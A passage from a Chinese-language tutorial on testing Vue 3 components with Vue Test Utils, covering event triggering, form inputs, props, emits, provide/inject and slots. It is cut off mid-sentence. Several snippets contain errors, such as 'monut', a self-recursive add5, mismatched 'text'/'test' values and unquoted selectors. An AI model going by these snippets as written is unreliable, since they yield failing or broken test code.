首先，語法方面除了表單事件之外，要模擬大部分的事件我們可以透過容器方法中的 trigger 方法即可觸發事件：\n1 wrapper.trigger(event, options) 用法是在第一個參數中傳入要觸發的 DOM 事件名稱（e.g. click、drag），如果有需要補充觸發事件的條件，比方像是按下哪個鍵盤，就可以透過第二個參數帶入資訊（e.g. { keyCode: 65 }）。\n而要注意到的是由於這些事件基本上都會是非同步的用法，所以在撰寫測試案例時可以使用 async/await 來讓斷言（Assertion）保持正確的結果：\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { // Arrange const wrapper = mount(component) // Act await wrapper.trigger(event, options) // Assert expect(/* ... */).toBe(/* ... */) }) 有了這個概念之後，接下來便可以快速來看看實際上各個事件觸發的實際案例與事件名稱，並且著重關注要特別注意的地方。\n滑鼠事件 點擊： click 雙擊： dblclick 指定點擊： click.left、click.middle、click.right 點擊與雙擊 點擊與雙擊的部分最主要需要注意的部分是，以事件來說的概念「雙擊（dblclick）」是一個事件，並非「兩個」「點擊（click）」事件：\n元件 1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const count = ref(0) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;p data-test=\u0026#34;content\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt; \u0026lt;button data-test=\u0026#34;button\u0026#34; @click=\u0026#34;count++\u0026#34;\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 測試程式碼 1 2 3 4 5 6 7 8 9 10 it(\u0026#39;after click button should display correct content\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;click\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;click\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;2\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;dblclick\u0026#39;) // 觸發不到 @click 事件 expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;4\u0026#39;) // AssertionError }) 指定按鍵點擊 有時候你可以會想要指定滑鼠的按鍵來觸發事件，這時就可以使用類似修飾符（modifier）一樣的方式來觸發事件：\nclick.left click.middle click.right 元件 1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; const result = ref(\u0026#39;\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button data-test=\u0026#34;button\u0026#34; @click.right=\u0026#34;result = \u0026#39;here we go!\u0026#39;\u0026#34;\u0026gt;Are You ready?\u0026lt;/button\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ result }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 測試程式碼 1 2 3 4 5 it(\u0026#39;should be display correct text\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).trigger(\u0026#39;click.right\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;here we go!\u0026#39;) }) 除此之外，鍵盤與滑鼠的操作也可以融合再一起：\n1 2 trigger(\u0026#39;click.ctrl.left\u0026#39;) // 左鍵點擊時同時按著 ctrl 鍵 trigger(\u0026#39;click.alt.right\u0026#39;) // 右鍵點擊時同時按著 alt 鍵 鍵盤事件 鍵盤最常見的核心事件主要為：\n按下某個按鈕 keydown 鬆開某個按鈕 keyup 上述事件如同指定滑鼠按鍵的寫法，一樣擁有修飾符的相關語法，而後方帶的修飾符主要為按鍵的名稱：\n1 2 trigger(\u0026#39;keydown.enter\u0026#39;) // 按下 enter 鍵 trigger(\u0026#39;keyup.up\u0026#39;) // 鬆開 上方向鍵 同樣地，鍵盤事件也支援多重的組合修飾符寫法：\n1 trigger(\u0026#39;keydown.ctrl.tab\u0026#39;) // 按下 ctrl 鍵 + tab 鍵 若你想要更靈活的使用鍵盤事件，也可以用 trigger 方法的第二個參數帶入鍵盤的名稱，而目前有支援的寫法主要有下列三種：\n1 2 3 4 5 trigger(\u0026#39;事件名稱\u0026#39;, { code?: event.code; key?: event.key; keyCode?: event.keycode; }) 若不清楚鍵盤對應的代號也沒有關係，有不少網站專門提供類似的服務供查詢，比方像這個 網站 只要按下任一按鍵就會即時顯示鍵盤對應的代號、名稱等等相關資訊。\n在查到代號後我們就可以將其帶入剛才的方法中：\n1 trigger(\u0026#39;keydown\u0026#39;, { keyCode: 13 }) 至於要選擇哪種寫法就看場景本身的需求來做決定囉！\n表單事件 input 輸入 checkbox / radio 勾選 \u0026lt;select\u0026gt; 中的選擇內容 原先為了針對不同表單類型，Vue Test Utils 1 版（for Vue2）工具提供了一個專屬的 setChecked 的來對應 checkbox / radio 勾選狀態（checked）；除此之外替 \u0026lt;select\u0026gt; 元素的選擇提供了 setSelected 方法來模擬選擇行為。\n而在 Vue Test utils 2 版時，我們將只要統一使用 setValue 即可自動對應所有表單的行為！\n模擬 input 輸入 輸入表單或是操作日期選擇器：\n1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;input v-model=\u0026#34;textResult\u0026#34; type=\u0026#34;text\u0026#34; data-test=\u0026#34;text\u0026#34;/\u0026gt; \u0026lt;p data-test=\u0026#34;result_text\u0026#34;\u0026gt;{{textResult}}\u0026lt;/p\u0026gt; \u0026lt;input v-model=\u0026#34;dateResult\u0026#34; type=\u0026#34;date\u0026#34; data-test=\u0026#34;date\u0026#34;/\u0026gt; \u0026lt;p data-test=\u0026#34;result_date\u0026#34;\u0026gt;{{dateResult}}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 文字輸入：\n1 2 3 4 5 it(\u0026#39;模擬 input 輸入\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find([data-test=\u0026#34;text\u0026#34;]).setValue(\u0026#39;Hello, World!\u0026#39;) expect(wrapper.find([data-test=\u0026#34;result_text\u0026#34;]).text()).toBe(\u0026#39;Hello, World!\u0026#39;) }) 選擇日期：\n1 2 3 4 5 it(\u0026#39;模擬 日期 輸入\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find([data-test=\u0026#34;date\u0026#34;]).setValue(\u0026#39;2022/10/06\u0026#39;) expect(wrapper.find([data-test=\u0026#34;result_date\u0026#34;]).text()).toBe(\u0026#39;2022/10/06\u0026#39;) }) 模擬 radio 勾選 元件 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;input data-test=\u0026#34;radio_1\u0026#34; type=\u0026#34;radio\u0026#34; v-model=\u0026#34;radioResult\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input data-test=\u0026#34;radio_2\u0026#34; type=\u0026#34;radio\u0026#34; v-model=\u0026#34;radioResult\u0026#34; value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;p data-test=\u0026#34;result\u0026#34;\u0026gt;{{ radioResult }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 測試程式碼 1 2 3 4 5 6 7 it(\u0026#39;模擬 radio 勾選行為\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;radio_1\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;1\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;radio_2\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;2\u0026#39;) }) 模擬 checkbox 勾選 元件 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;input data-test=\u0026#34;checkbox_1\u0026#34; type=\u0026#34;checkbox\u0026#34; v-model=\u0026#34;checkboxResult\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input data-test=\u0026#34;checkbox_2\u0026#34; type=\u0026#34;checkbox\u0026#34; v-model=\u0026#34;checkboxResult\u0026#34; value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;p data-test=\u0026#34;result\u0026#34;\u0026gt;{{ checkboxResult.join(\u0026#39;,\u0026#39;) }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 測試程式碼 1 2 3 4 5 6 7 8 9 it(\u0026#39;模擬 checkbox 勾選行為\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;checkbox_1\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;checkbox_2\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;1,2\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;checkbox_1\u0026#34;]\u0026#39;).setValue(false) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;2\u0026#39;) }) 模擬 select 選擇 元件 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;select data-test=\u0026#34;target\u0026#34; v-model=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;orange\u0026#34;\u0026gt;Orange\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;black\u0026#34;\u0026gt;Black\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;p data-test=\u0026#34;result\u0026#34;\u0026gt;{{ result }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 測試程式碼 1 2 3 4 5 it(\u0026#39;模擬 select 選擇\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).setValue(\u0026#39;orange\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;orange\u0026#39;) }) 模擬 Vue APIs data 注意：在模擬 data 之前需要注意的是，在大部分的測試時我們通常不必特意去模擬 data，應該讓其與元件本身的私有方法（private method）自然互動即可，若會需要透過模擬 data 來操作元件則要觀察是否資料與元件本身耦合了，這種情況下可能造成元件本身無法高度重複利用。\n私有方法（private method） 封閉在元件、物件\u0026hellip;等等中的函式，在外部無法存取得到，e.g：\n1 2 3 4 5 6 function add5(x){ const add = (x,y,) =\u0026gt; x + y return add5(5, x) } // 裡頭的 add 函式即為私有方法。 若是真的有需要用到模擬 data 屬性時，首先要注意元件是用何種方式（options API /composition API 與 \u0026lt;script setup\u0026gt;）來使用 data，因為寫法上將會有所不同；且依照設定的時機還可分為「初始狀態」與「後續操作」。\ndata（options API） 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;template\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ content }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { content: \u0026#39;\u0026#39; } } } \u0026lt;/script\u0026gt; data（option API）初始狀態模擬，可透過容器（wrapper）的第二個參數帶入：\n1 2 3 4 5 6 7 8 9 10 /* 測試程式碼 */ const wrapper = mount(component, { data(){ return { content: \u0026#39;test\u0026#39; } } }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;test\u0026#39;) 若要模擬後續才設定 data（option API），則可以透過容器方法中的 setData() 設置，此外由於是非同步的方法，要記得 async/await 才能確保斷言正確：\n1 2 3 4 5 6 7 8 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.setData({ content: \u0026#39;test\u0026#39; }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;test\u0026#39;) }) data（composition API, \u0026lt;script setup\u0026gt; 語法糖） composition API： 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; export default { setup() { const content = ref(\u0026#39;\u0026#39;) return { content } } } \u0026lt;/script\u0026gt; \u0026lt;script setup\u0026gt; 語法糖： 1 2 3 4 \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const content = ref(\u0026#39;\u0026#39;) \u0026lt;/script\u0026gt; 這一類透過 setup() 所處理的資料，若要模擬會遇到不少問題。\n在容器方法中的第二個參數所提供的方式，原先是供應給 options API 中的 data 屬性所使用，所以我們必須改以注入的方式嵌入 setup()：\n1 2 3 4 5 6 7 8 /* 測試程式碼 */ const wrapper = monut(component, { setup(){ return { content:\u0026#39;\u0026#39; } } }) 但如此一來，元件中原先其他寫在 setup() 內的狀態等就必須一起模擬，還記得好的元件測試守則之一嗎？沒錯，就是不要重複實踐實作。\n那比較好的方式之一就是透過容器方法中（wrapper）取得實體來設置變數，並且透過 nextTick 方法確保渲染結果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 it(\u0026#39;...\u0026#39; , async () =\u0026gt; { /* 測試程式碼 */ const wrapper = monut(component) wrapper.vm.content = \u0026#39;text\u0026#39; // 版本1: 直接使用 vm 內的 $nextTick await wrapper.vm.$nextTick() // 版本2: 使用 vue 的 nextTick // import { nextTick } from \u0026#39;vue\u0026#39; // await nextTick() expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;test\u0026#39;) }) 而關於私有方法或變數的模擬，或許將來 Vue Test Utils 開發團隊會對此有些改觀提供一些逃生艙的方法，不過目前比較一致的角度是盡量別對這一類的私有環境才有的變數與方法去做模擬，即時的相關討論可見於這裡。\nprops 在不模擬私有情境的前提之下，prop 相較起來單純多了，而關於測試 props 的部分主要有：\n模擬 props 傳入後，斷言「後續的狀態」。 斷言「是否傳入對的參數給子元件」。 模擬 props 傳入 要模擬 props 傳入的方法依照時機可分為「初始狀態」與「後續操作」：\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ content }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 初始狀態同樣是藉由容器（Wrapper）中的第二個參數傳入：\n1 2 3 4 5 6 7 8 it(\u0026#39;\u0026#39;, () =\u0026gt; { const wrapper = mount(component, { props: { content: \u0026#39;Hello\u0026#39; } }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;Hello\u0026#39;) }) 若想要後續才傳入 props 則可以透過容器方法 setProps 模擬，並且一樣要小心非同步的問題，記得補上 async / await ：\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(component, { props: { content: \u0026#39;Hello\u0026#39; } }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;Hello\u0026#39;) await wrapper.setProps({ content: \u0026#39;Good bye\u0026#39; }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;Good bye\u0026#39;) }) 斷言是否傳入對 props 參數給子元件 既然有接收的一方，那就至少會有給予的一方。\n在 props 驗證中的另一種方式就是驗證給予其他元件的參數是否正確：\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;BaseLightbox content\u0026#34;Hello\u0026#34; enableMask=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; 首先我們要做的是透過之前學的選擇器方法選到特定的元件，接著透過容器方法底下的 props() 來取的傳送資訊，接著就可以透過斷言 Matcher 來比對 props 給元件的資訊是否正確：\n1 2 3 4 5 6 7 8 9 10 11 12 import { BaseLightbox } from \u0026#39;./BaseLightbox.vue\u0026#39; it(\u0026#39;\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) const target = wrapper.get(BaseLightbox) expect(target.props(content)).toEqual(\u0026#39;Hello\u0026#39;) expect(target.props(enableMask)).toEqual(true) expect(target.props()).toEqual({ content: \u0026#39;Hello\u0026#39;, enableMask: true, }) }) emit 在斷言中我們要測試 emit 主要是試圖捕獲元件所發生的事件，並斷言事件與值是否如我們所預期，而這時可以透過容器方法中的 emitted() 來取得事件發送所有的紀錄。\n而 emitted 中所紀錄的格式如下：\n1 2 3 4 5 6 7 { \u0026#39;事件名稱\u0026#39;: [ [/* 第一次發送的值 */], [/* 第二次發送的值 */], [/* 第 n 次發送的值 */] ] } 因此假設我們有一個 pagination 元件如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div data-test=\u0026#34;first\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;first\u0026#39;)\u0026#34;\u0026gt; 第一頁 \u0026lt;/div\u0026gt; \u0026lt;div data-test=\u0026#34;prev\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;prev\u0026#39;)\u0026#34;\u0026gt; 上一頁 \u0026lt;/div\u0026gt; \u0026lt;div data-test=\u0026#34;next\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;next\u0026#39;)\u0026#34;\u0026gt; 下一頁 \u0026lt;/div\u0026gt; \u0026lt;div data-test=\u0026#34;last\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;last\u0026#39;)\u0026#34;\u0026gt; 最後一頁 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在斷言的時候我們可以透過下列方式檢查是否發送對應的 emit 事件：\n透過 toHaveProperty 確認 emitted 屬性確認是否發送「預期事件名稱」 透過 emitted().事件名稱 確認該事件名稱「發生次數」 透過 emitted().事件名稱[index] 確認該事件名稱，第幾次送出的「值」 1 2 3 4 5 6 7 8 9 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) await wrapper.find(\u0026#39;[data-test=\u0026#34;first\u0026#34;]\u0026#39;).trigger(\u0026#39;click\u0026#39;) expect(wrapper.emitted()).toHaveProperty(\u0026#39;changePage\u0026#39;) expect(wrapper.emitted().changePage).toHaveLength(1) expect(wrapper.emitted().changePage[0]).toEqual([\u0026#39;first\u0026#39;]) }) provide 對於有使用到 provide 的元件來說，我們需要確保他提供預期的 inject 內容，因此我們要建立一個用來接收 provide 的元件，接著才能透過斷言來測試傳遞的內容是否如預期。\n接下來我們以這個元件為例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ChildComponent /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, provide, readonly } from \u0026#39;vue\u0026#39; export default { setup() { const count = ref(1) provide(\u0026#39;count\u0026#39;, readonly(count)) }, } \u0026lt;/script\u0026gt; 然而我們為了讓測試案例保持獨立性，因此我們要透過造假的元件來測試 inject 所接收到的是否如預期。\n透過元件容器中的 global.stubs 模擬假元件 透過元件容器（Wrapper）中的第二個參數 global.stubs 我們可以將子元件渲染成我們想要的樣子，而模擬的方式一共分為兩種：\n渲染成 \u0026lt;-stub\u0026gt; 元件 當 global.stub[目標元件名稱] 為 true 時：\n1 2 3 4 5 6 7 const wrapper = mount(TargetComponent, { global: { stubs: { ChildComponent: true, }, }, }) 我們的目標元件將會被渲染為帶有 -stub 後綴的元素：\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ChildComponent /\u0026gt; \u0026lt;!-- 會變成 \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 然而這對於我們要測試 provide 來說沒有幫助，因為他沒有辦法接收 inject 資訊，因此我們要採用下面第二種方法。\n渲染成特定元件 要渲染成特定元件的方式，就是先製作一個假元件，接著再提供給 global.stubs 來當作原先應該要渲染的元件。\n首先，我們可以透過 Vue 提供的 defineComponent 建造元件：\n1 2 3 4 5 6 7 8 9 import { defineComponent } from \u0026#39;vue\u0026#39; const TestComponent = defineComponent({ template: \u0026#39;\u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt;\u0026#39;, setup() { const value = inject(\u0026#39;count\u0026#39;) return { value } }, }) 接著在測試案例就可以透過 global.stubs 中直接使用這個測試元件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import { defineComponent } from \u0026#39;vue\u0026#39; const TestComponent = defineComponent({ template: \u0026#39;\u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt;\u0026#39;, setup() { const value = inject(\u0026#39;count\u0026#39;) return { value } }, }) it(\u0026#39;...\u0026#39; , () =\u0026gt; { const wrapper = mount(TargetComponent, { global: { stubs: { ChildComponent: TestComponent, }, }, }) }) 如此一來元件 ChildComponent 在測試案例中的渲染結果將變成我們指定的樣子。\n1 2 3 \u0026lt;div\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;1\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 因此我們現在就可以斷言 provide 提供的內容是否正確了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const TestComponent = defineComponent({ template: \u0026#39;\u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt;\u0026#39;, setup() { const count = inject(\u0026#39;count\u0026#39;) return { count } }, }) it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(TargetComponent, { global: { stubs: { ChildComponent: TestComponent, }, }, }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) }) inject 對於有使用到 inject 的元件來說，我們在意的是提供 provide 特定的值之後，畫面上渲染的結果是否正確。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { inject } from \u0026#39;vue\u0026#39; export default { setup() { const count = inject(\u0026#39;count\u0026#39;) return { count } }, } \u0026lt;/script\u0026gt; 此時我們可以透過元件容器（Wrapper）中的第二個參數 global 來指定要提供的 provide 值：\n1 2 3 4 5 6 7 const wrapper = mount(TargetComponent, { global: { provide: { count: 1, }, }, }) 最後我們就可以直接斷言渲染的結果是否如預期：\n1 2 3 4 5 6 7 8 9 10 11 it(\u0026#39;should be render correct content after providing count\u0026#39;, async () =\u0026gt; { const wrapper = mount(TargetComponent, { global: { provide: { count: 1, }, }, }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) }) slots 而在針對 slots 撰寫測試時，要注意的地方有：\nslots 至少會有預設未傳入的狀態與傳入資料後的狀態兩種，斷言時應該至少包含這兩種狀態。 以 slots 行為作為案例斷言時，斷言內容要專注在 slots 所影響範圍內，否則可能會受其他因素干擾。 預設插槽（Default slots） 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 要針對最基本的預設插槽做斷言時，我們可以透過容器中第二個參數帶入 slots 欄位來模擬帶入內容並透過 default 屬性傳入指定的範圍內。\n未傳入測試案例：\n1 2 3 4 it(\u0026#39;default slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.html()).toMatchInlineSnapshot() }) 傳入時測試案例：\n1 2 3 4 5 6 7 8 9 it(\u0026#39;default slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component, { slots: { default: \u0026#39;Slot Content\u0026#39;, }, }) expect(wrapper.html()).toContain(\u0026#39;Slot Content\u0026#39;) }) 具名插槽（Named slots） 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;slot name=\u0026#34;header\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;slot name=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 若在插槽的型態為具名插槽，在撰寫測試案例時的容器選項 slots 就可以依據插槽名稱 name 指定要傳入的內容。\n未傳入測試案例：\n1 2 3 4 it(\u0026#39;named slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.html()).toMatchInlineSnapshot() }) 傳入時測試案例：\n1 2 3 4 5 6 7 8 9 10 11 it(\u0026#39;named slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component, { slots: { header: \u0026#39;ithelp 2022 鐵人賽\u0026#39;, body: \u0026#39;vue3 單元測試\u0026#39;, footer: \u0026#39;by Shawn\u0026#39;, }, }) expect(wrapper.html()).toMatchInlineSnapshot() }) 作用域插槽（Scoped slots） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;貓咪咖啡廳：\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;店長：Shawn\u0026lt;/p\u0026gt; \u0026lt;slot :staffInfo=\u0026#34;staffInfo\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const staffInfo = { \u0026#39;black-cat\u0026#39;: { name: \u0026#39;黑黑\u0026#39;, \u0026#39;signature-dish\u0026#39;: \u0026#39;拿鐵\u0026#39;, }, \u0026#39;orange-cat\u0026#39;: { name: \u0026#39;阿橘\u0026#39;, \u0026#39;signature-dish\u0026#39;: \u0026#39;焦糖瑪奇朵\u0026#39;, }, } \u0026lt;/script\u0026gt; 有時候我們可能想要給予更高度的彈性，使元件透過 \u0026lt;slot\u0026gt; 傳遞資料給父層時，這時候就會用到作用域插槽。\n未傳入測試案例：\n1 2 3 4 5 6 7 8 9 it(\u0026#39;scoped slots\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.html()).toMatchInlineSnapshot(` \u0026#34;\u0026lt;div\u0026gt; \u0026lt;p\u0026gt;貓咪咖啡廳：\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;店長：Shawn\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt;\u0026#34; `) }) 傳入時測試案例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 it(\u0026#39;scoped slots\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component, { slots: { default: ` \u0026lt;template #staffInfo\u0026gt; \u0026lt;p\u0026gt;店員：{{ staffInfo[\u0026#39;orange-cat\u0026#39;][\u0026#39;name\u0026#39;] }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;限定項目：{{ staffInfo[\u0026#39;black-cat\u0026#39;][\u0026#39;signature-dish\u0026#39;] }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; `, }, }) expect(wrapper.html()).toMatchInlineSnapshot(` \u0026#34;\u0026lt;div\u0026gt; \u0026lt;p\u0026gt;貓咪咖啡廳：\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;店長：Shawn\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;店員：阿橘\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;限定項目：拿鐵\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt;\u0026#34; `) }) 插槽載入選項（Mounting options） 若想在測試案例中用不同的方式來模擬 slots，可以透過下面四種語法：\n傳入 SFC 檔案 render function 包含 template 屬性的物件 直接傳入一個字串 1 2 3 4 5 6 7 8 9 10 11 it(\u0026#39;should render same layout\u0026#39;, () =\u0026gt; { const wrapper = mount(Layout, { slots: { default: Component // default: h(\u0026#39;div\u0026#39;, \u0026#39;相同內容\u0026#39;), // default: { template: \u0026#39;\u0026lt;div\u0026gt;相同內容\u0026lt;/div\u0026gt;\u0026#39; }, // default: \u0026#39;\u0026lt;div\u0026gt;相同內容\u0026lt;/div\u0026gt;\u0026#39;, } }) expect(wrapper.html()).toContain(\u0026#39;\u0026lt;div\u0026gt;相同內容\u0026lt;/div\u0026gt;\u0026#39;) }) custom directives 客製化指令本身搭配了類似元件生命週期的 Hooks，而我們可以在那些 Hook 中任意對我們所綁定的元素做開發，讓繁複的邏輯透過簡單的指令就能夠重複利用，使我們在開發過程中的開發者體驗（Developer experience, 